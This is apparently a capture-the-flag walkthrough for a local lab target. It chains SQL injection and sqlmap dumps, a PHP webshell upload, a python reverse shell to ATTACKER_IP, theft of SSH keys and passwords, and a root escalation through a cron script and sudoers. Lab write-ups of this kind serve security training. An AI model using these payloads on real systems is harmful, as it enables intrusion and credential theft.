# T3rmx CTF — Team Solution Guide (Walkthrough)

This is the *intended/success path*. Target: **HTTP `http://127.0.0.1:8080`** and
**SSH `127.0.0.1:2222`** (or the challenge-provided host/ports).
You must grab **3 flags** and verify them with the container verifier.

Attack path: **SQLi → dump DB → login → upload webshell → RCE → developer SSH → laour → root (cron)**

---

## Step 0 — Recon

```bash
nmap -sV -p- 127.0.0.1      # or the challenge host; expect 80(→8080) web + 22(→2222)
curl http://127.0.0.1:8080/
curl http://127.0.0.1:8080/robots.txt   # hints at /admin, /api, /uploads
```

`/api`, `/status`, `/news`, `/about` may leak small hints but the main path is the
login form.

---

## Step 1 — SQL injection + dump the database

The login form (`POST /login` with `username` + `password`) concatenates both
inputs directly into the SQL query (`web/app/auth.php`) — passwords are stored
in **plaintext**.

Trivial bypasses (`' or 1=1 --`) are blocked on purpose (returns
"Multiple accounts matched…"), but the query is still injectable and the
difference between the `multiple` and `invalid` responses is a **boolean oracle**.

### Quick test

```bash
# username=admin, password=' or 1=1 --
curl -s -X POST http://127.0.0.1:8080/login \
  --data "username=admin&password=' or 1=1 --" | grep -i "Multiple"
# inject a FALSE condition:
curl -s -X POST http://127.0.0.1:8080/login \
  --data "username=admin&password=' OR 1=1--" | grep -i "Invalid"
```

Different messages → boolean-based blind SQLi confirmed on the **password** param.

### Dump with sqlmap

```bash
sqlmap -u "http://127.0.0.1:8080/login" \
  --data "username=admin&password=x" \
  -p password --dbms=sqlite --batch

# full dump of the authorization table
sqlmap -u "http://127.0.0.1:8080/login" \
  --data "username=admin&password=x" \
  -p password --dbms=sqlite --batch --tables

sqlmap -u "http://127.0.0.1:8080/login" \
  --data "username=admin&password=x" \
  -p password --dbms=sqlite --batch -D db -T users --dump
```

You now have plaintext passwords for `admin`, `jsmith`, … Save them.
**From here on, use the real credentials — do not keep injecting.**

> Manual fallback (same idea): the `users` schema is
> `id, username, password, role, email, full_name, department, created_at, last_login, is_active`
> (extractable with `' UNION SELECT ... -- ` payloads.)

---

## Step 2 — Log in as admin

```bash
curl -s -c cookies.txt -X POST http://127.0.0.1:8080/login \
  --data-urlencode "username=admin" --data-urlencode "password=<DUMPED_ADMIN_PASS>"
# verify you land on the admin panel
curl -s -b cookies.txt http://127.0.0.1:8080/admin
```

---

## Step 3 — Upload a PHP webshell (RCE)

The upload form (`/admin/uploads`) only trusts the **client-provided Content-Type**,
and the whole uploads directory is passed through the **PHP engine** — a PHP payload
executes **no matter its extension** (`.png`, `.jpg`, `.txt`, …). Upload a PHP shell
with a spoofed MIME type:

```php
# shell.png  (PHP content inside an image extension — still executes)
<?php system($_GET['c']); ?>
```

```bash
curl -s -b cookies.txt \
  -F "file=@shell.png;type=image/png" \
  http://127.0.0.1:8080/admin/uploads

# shell is now live (original filename kept)
curl "http://127.0.0.1:8080/uploads/shell.png?c=id"
```

> The page lists uploads with a preview; links point to `/uploads/<original-name>`,
> which Apache runs through PHP.

---

## Step 4 — Reverse shell as `www-data`

Outbound is open (`host.docker.internal` reaches the host). From your host:

```bash
nc -lvnp 4444
```

From the webshell:

```bash
# python3 reverse shell
curl "http://127.0.0.1:8080/uploads/shell.php?c=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

You now have a shell as **www-data**.

---

## Step 5 — Read secrets → SSH as `developer` → developer flag

```bash
id
cat /var/www/app/.env
#   SSH_KEY_PATH=/var/www/app/developer_key
#   DEPLOY_USER=developer   (all passwords redacted here, they're real in-game)

ls -la /var/www/app/developer_key*   # private key readable by www-data

# ✅ Path A (recommended — no key transfer, zero permission hassle):
#    from the www-data reverse shell, SSH to localhost with the stolen key.
#    The key is already mode 600 owned by www-data inside the container.
ssh -i /var/www/app/developer_key -o StrictHostKeyChecking=no developer@127.0.0.1

# ⚠️ Path B — if you copy the key to YOUR machine instead:
#    OpenSSH refuses keys that are readable by group/others (too-open perms).
#    You MUST tighten them first, otherwise ssh falls back to asking a password:
#        chmod 600 developer_key
#        ssh -i developer_key developer@<host> -p 2222
cat /var/www/app/config/backup.ini   # (readable later as developer)
```

As **developer**:

```bash
whoami                     # developer
cat /home/developer/user.txt   # ⭐ FLAG 1  (developer)
cat /var/www/app/config/backup.ini
#   [backup_server] user = laour / password = <LAOUR_OS_PASS>   ← the ops account
```

---

## Step 6 — Pivot to `laour` → laour flag

```bash
su - laour          # or ssh laour@127.0.0.1 with the password from backup.ini
whoami              # laour
cat /home/laour/user.txt    # ⭐ FLAG 2  (laour)
```

Optional recon as laour:

```bash
sudo -l                              # no passwordless sudo by default
find / -perm -777 -type d 2>/dev/null
cat /opt/t3rmx/services/maintenance/runtime/logs/notes.txt
```

---

## Step 7 — Escalate to root (777 + root cron) → root flag

`/opt/t3rmx/services/maintenance/runtime/scripts` is **world-writable (777)** and a
root cron (`/etc/cron.d/t3rmx-maintenance`) executes `cleanup.sh` from it **every
minute**:

```bash
cat /etc/cron.d/t3rmx-maintenance    # * * * * * root cleanup.sh
```

Overwrite `cleanup.sh` with a payload that root will run (use the same 777 dir so
root, developer or laour can all plant it — here laour does):

```bash
cat > /opt/t3rmx/services/maintenance/runtime/scripts/cleanup.sh <<'EOF'
#!/bin/bash
cp /root/root.txt /tmp/rootflag.txt
chmod 644 /tmp/rootflag.txt
chown laour:laour /tmp/rootflag.txt
EOF
chmod +x /opt/t3rmx/services/maintenance/runtime/scripts/cleanup.sh
```

Cron fires once a minute — within a minute root will run your payload, then:

```bash
cat /tmp/rootflag.txt    # ⭐ FLAG 3  (root)
```

> Faster/cleaner payload: grant yourself better access, e.g.
> `echo "laour ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/laour` — then
> `sudo su -` and `cat /root/root.txt` directly.

---

## Step 8 — Submit & verify

Two ways:

- **Web portal:** open `http://127.0.0.1:8080/verify`, paste up to three flags, submit — the portal answers VALID/INVALID per flag.
- **Container CLI** (equivalent):

```bash
python3 /opt/t3rmx/verifier/verifier.py 'TCI{…}' 'TCI{…}' 'TCI{…}'
# expect: [VALID] (developer|laour|root) for each → "All flags verified successfully!"
```

---

## Key artifacts cheatsheet

| artifact                                          | grants                    |
|---------------------------------------------------|---------------------------|
| dumped `users` table (`admin`/`jsmith` passwords) | admin panel login         |
| uploaded shell (`/uploads/shell.php`)             | RCE as `www-data`         |
| `/var/www/app/developer_key`                      | SSH as `developer`        |
| `/var/www/app/config/backup.ini` (laour password) | SSH as `laour`            |
| `/opt/.../runtime/scripts/cleanup.sh` (777 + cron)| code exec as `root`       |